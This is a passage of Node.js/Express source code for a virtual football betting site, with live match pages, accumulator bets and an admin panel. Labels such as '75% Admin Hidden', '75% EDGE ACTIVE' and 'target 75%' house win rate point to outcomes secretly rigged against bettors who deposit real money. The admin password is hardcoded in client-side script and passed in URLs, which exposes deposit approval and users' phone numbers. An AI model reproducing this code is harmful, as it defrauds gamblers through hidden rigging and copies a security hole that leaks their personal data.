  let j=await r.json(); if(j.ok){ alert("ACCA placed! Odd x"+j.odd.toFixed(1)+" Win "+j.potential.toLocaleString()); clearAcca(); loadAccas(); } else alert(j.error);
}
async function loadS(){
 let r=await fetch("/api/virtual/status"); let d=await r.json();
 document.getElementById('top').textContent='S'+d.season+' MD'+d.matchday+' • ACCA x256 • 75% Admin Hidden';
 let box=document.getElementById('featBox'); let tl=Math.floor(d.timeLeft/60)+":"+String(d.timeLeft%60).padStart(2,'0');
 if(d.phase==='betting'){
   box.innerHTML='<span class="phase betting">BETTING '+tl+'</span><span class=timer>'+tl+'</span><div style="margin-top:24px"><div class=score>MD'+d.matchday+' - 8 MATCHES</div><small>Season '+d.season+' • 2=x4 4=x19 8=x256<br>Max 7 goals • 0-0 possible</small></div>';
   let html=''; (d.nextAll||[]).forEach(m=>{
     html+='<div class=matchCard><div style="display:flex;justify-content:space-between;font-weight:bold"><span>'+m.home.short+' vs '+m.away.short+'</span><span style="font-size:9px">MD'+d.matchday+'</span></div><div style="font-size:10px;color:#aaa;margin:4px 0">'+m.home.name+' vs '+m.away.name+'</div><div style="display:flex"><button class="betBtn home" data-match="'+m.id+'" data-pred="home" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','home')\">"+m.home.short+' x2</button><button class="betBtn draw" data-match="'+m.id+'" data-pred="draw" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','draw')\">DRAW x2</button><button class="betBtn away" data-match="'+m.id+'" data-pred="away" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','away')\">"+m.away.short+' x2</button></div></div>';
   }); document.getElementById('allMatchesBet').innerHTML=html; selections.forEach(s=>{ let el=document.querySelector('[data-match="'+s.matchId+'"][data-pred="'+s.prediction+'"]'); if(el) el.classList.add('sel'); });
 } else {
   let f=d.current; box.innerHTML='<span class="phase '+(d.phase==='halftime'?'ht':'live')+'">'+(d.phase==='halftime'?'HT':'LIVE '+f.minute+"'")+' '+tl+'</span><span class=timer>'+tl+'</span><div style="margin-top:24px"><div class=score>'+f.home.short+' '+f.homeScore+'-'+f.awayScore+' '+f.away.short+'</div><small>'+(f.events[0]||'')+'</small></div>';
   let html=''; (d.allLive||[]).forEach(m=>{
     html+='<div class=matchCard><div style="display:flex;justify-content:space-between;font-weight:bold"><span>'+m.home.short+' '+m.homeScore+'-'+m.awayScore+' '+m.away.short+' '+m.minute+"'</span><span style='font-size:9px'>"+(m.result||'LIVE')+'</span></div><div style="font-size:10px;color:#aaa">'+(m.events[0]||'').slice(0,60)+'</div>'+(d.phase==='halftime'?'<div style="display:flex;margin-top:6px"><button class="betBtn home" data-match="'+m.id+'" data-pred="home" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','home')\">"+m.home.short+' x2</button><button class="betBtn draw" data-match="'+m.id+'" data-pred="draw" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','draw')\">DRAW</button><button class="betBtn away" data-match="'+m.id+'" data-pred="away" onclick="toggleSel('+m.id+",'"+m.home.name+"','"+m.away.name+"','"+m.home.short+"','"+m.away.short+"','away')\">"+m.away.short+'</button></div>':'')+'</div>';
   }); document.getElementById('allMatchesBet').innerHTML=html; selections.forEach(s=>{ let el=document.querySelector('[data-match="'+s.matchId+'"][data-pred="'+s.prediction+'"]'); if(el) el.classList.add('sel'); });
 }
 let tb=''; d.table.forEach((t,i)=>{ tb+='<div class=row><span>'+(i+1)+'. '+t.short+'</span><span>'+t.P+' '+t.W+' '+t.D+' '+t.L+' '+t.GF+'-'+t.GA+' <b style=color:gold>'+t.Pts+'</b></span></div>'; }); document.getElementById('table').innerHTML=tb;
}
async function loadAccas(){ let r=await fetch("/api/virtual/myaccas/"+uid); let d=await r.json(); let h=d.map(a=>{ let sels=a.selections||[]; let selTxt=sels.map(s=>s.homeTeam.slice(0,3)+' '+s.prediction.slice(0,1).toUpperCase()).join(', '); let c=a.status==='won'?'#0f0':a.status==='lost'?'red':'gold'; return '<div style="background:#111;padding:8px;border-radius:8px;margin:4px 0;border-left:3px solid '+c+';font-size:10px"><b>ACCA '+sels.length+' x'+(a.odd||0).toFixed(1)+'</b> '+a.amount+' => '+a.status.toUpperCase()+' '+(a.winAmount||0)+'<br><small>'+selTxt+'</small></div>'; }).join(''); document.getElementById('myAccas').innerHTML=h||'No ACCA'; let ru=await fetch("/api/user/"+uid); let u=await ru.json(); document.getElementById('gBal').textContent=(u.gameBalance||0).toLocaleString(); }
setInterval(loadS,1000); loadS(); loadAccas(); setInterval(loadAccas,5000);
</script></body></html>`,
};
function render(name,res){ res.send(pages[name]); }
app.get('/',(req,res)=>render('home',res));
app.get('/dashboard',(req,res)=>render('dash',res));
app.get('/virtual',(req,res)=>render('virtual',res));
app.get('/admin',(req,res)=>{ res.send(`<html><body><h2>Admin 75% ALL BETS</h2><input id="pass" type="password"><button onclick="check()">Unlock</button><div id="box" style="display:none"><div id="stats"></div><div id="deps"></div><div id="virt"></div></div><script>
const AP="LIFELINE123";function check(){ if(pass.value===AP){ box.style.display="block"; load(); } }
async function load(){ let r=await fetch("/api/admin/deposits?key="+AP); let d=await r.json(); document.getElementById('deps').innerHTML="<h3>Deposits "+d.length+"</h3>"+d.map(x=>"<div>"+x.phone+" "+x.amount+"<button onclick=ap("+x.id+")>OK</button></div>").join(''); let rv=await fetch("/api/admin/virtual?key="+AP); let v=await rv.json(); let acc=v.accas||[]; let singles=v.singles||[]; let profit=0, totalBet=0; acc.forEach(a=>{ totalBet+=a.amount; if(a.status==='lost') profit+=a.amount; else if(a.status==='won') profit-=a.winAmount; }); singles.forEach(a=>{ totalBet+=a.amount; if(a.status==='lost') profit+=a.amount; else if(a.status==='won') profit-=a.winAmount; }); let winRate=acc.length+singles.length>0? (acc.filter(a=>a.status==='lost').length+singles.filter(a=>a.status==='lost').length)/(acc.length+singles.length)*100:0; document.getElementById('stats').innerHTML="<div style=background:#111;padding:10px;border:1px solid gold><b>ALL BETS 75% EDGE ACTIVE</b><br>Total Bet: "+totalBet+"<br>Profit: <b style=color:"+(profit>0?"#0f0":"red")+">"+profit+" UGX</b><br>House Win Rate: "+winRate.toFixed(1)+"% (target 75%)<br>Singles: "+singles.length+" ACCAs: "+acc.length+"</div>"; document.getElementById('virt').innerHTML=acc.slice(0,30).map(a=>"<div style=font-size:10px;background:#222;margin:2px;padding:4px>"+a.phone+" ACCA S"+a.season+" MD"+a.matchday+" x"+a.odd+" "+a.amount+" => "+a.status+" "+(a.winAmount||0)+"</div>").join('')+singles.slice(0,20).map(a=>"<div style=font-size:10px;background:#222;margin:2px;padding:4px>"+a.phone+" SINGLE "+a.homeTeam+" vs "+a.awayTeam+" "+a.prediction+" "+a.amount+" "+a.status+"</div>").join(''); }
async function ap(id){ await fetch("/api/admin/approve/"+id+"?key="+AP,{method:"POST"}); load(); }
</script></body></html>`); });
app.listen(process.env.PORT||3000,()=>console.log("FINAL 16 TEAMS 8 MATCHES ACCA x256 75% ALL BETS READY"));
